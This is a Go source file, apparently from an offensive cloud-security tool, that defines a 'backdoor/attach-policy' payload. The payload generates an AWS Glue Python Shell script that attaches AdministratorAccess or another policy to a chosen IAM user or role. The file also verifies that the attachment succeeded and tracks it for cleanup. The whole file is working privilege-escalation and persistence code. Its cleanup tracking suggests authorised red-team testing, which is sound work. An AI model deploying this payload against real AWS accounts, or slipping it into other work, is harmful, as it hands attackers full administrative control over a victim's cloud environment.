// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package glue

import (
	"context"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a Glue Python Shell script that attaches
// AdministratorAccess (or a custom policy) to a specified IAM user.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an existing IAM user or role via Glue job"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN, tries both if plain name)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach (defaults to AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

// GenerateCode produces a standalone Python script for Glue Python Shell execution.
// Parameters are passed as Glue job arguments (--TARGET_USER, --POLICY_ARN) and
// read via sys.argv parsing since getResolvedOptions requires the awsglue package.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	code := fmt.Sprintf(`import boto3
import sys

target = '%s'
policy_arn = '%s'

# Override from job arguments if provided
for i, arg in enumerate(sys.argv):
    if arg == '--TARGET_ARN' and i + 1 < len(sys.argv):
        target = sys.argv[i + 1]
    if arg == '--POLICY_ARN' and i + 1 < len(sys.argv):
        policy_arn = sys.argv[i + 1]

iam = boto3.client('iam')

# Auto-detect principal type from ARN format
principal_type = None
principal_name = target

if target.startswith('arn:'):
    if ':user/' in target:
        principal_type = 'user'
        principal_name = target.split(':user/')[-1]
    elif ':role/' in target:
        principal_type = 'role'
        principal_name = target.split(':role/')[-1]

try:
    if principal_type == 'role':
        iam.attach_role_policy(RoleName=principal_name, PolicyArn=policy_arn)
    elif principal_type == 'user':
        iam.attach_user_policy(UserName=principal_name, PolicyArn=policy_arn)
    else:
        # Plain name -- try user first, fall back to role
        try:
            iam.attach_user_policy(UserName=principal_name, PolicyArn=policy_arn)
            principal_type = 'user'
        except iam.exceptions.NoSuchEntityException:
            iam.attach_role_policy(RoleName=principal_name, PolicyArn=policy_arn)
            principal_type = 'role'

    print(f"Successfully attached {policy_arn} to {principal_type} {principal_name}")
except Exception as e:
    print(f"Error attaching policy: {e}")
    raise
`, targetARN, policyArn)

	return code, nil
}

// ProcessResult passes through the module's result string. Glue jobs don't return
// output to the caller -- the module verifies the effect by checking IAM state.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// VerifySuccess checks whether the target principal has the attached policy.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	iamClient := iam.NewFromConfig(config)

	if principalType == "role" {
		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
			RoleName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	} else {
		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
			UserName: aws.String(principalName),
		})
		if err != nil {
			return false, nil
		}
		for _, policy := range result.AttachedPolicies {
			if aws.ToString(policy.PolicyArn) == policyArn {
				return true, nil
			}
		}
	}

	return false, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

// parsePrincipalARN extracts the principal name and type from an ARN or plain name.
func parsePrincipalARN(input string) (name string, principalType string) {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":role/"); idx != -1 {
			return input[idx+len(":role/"):], "role"
		}
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):], "user"
		}
	}
	return input, "user"
}
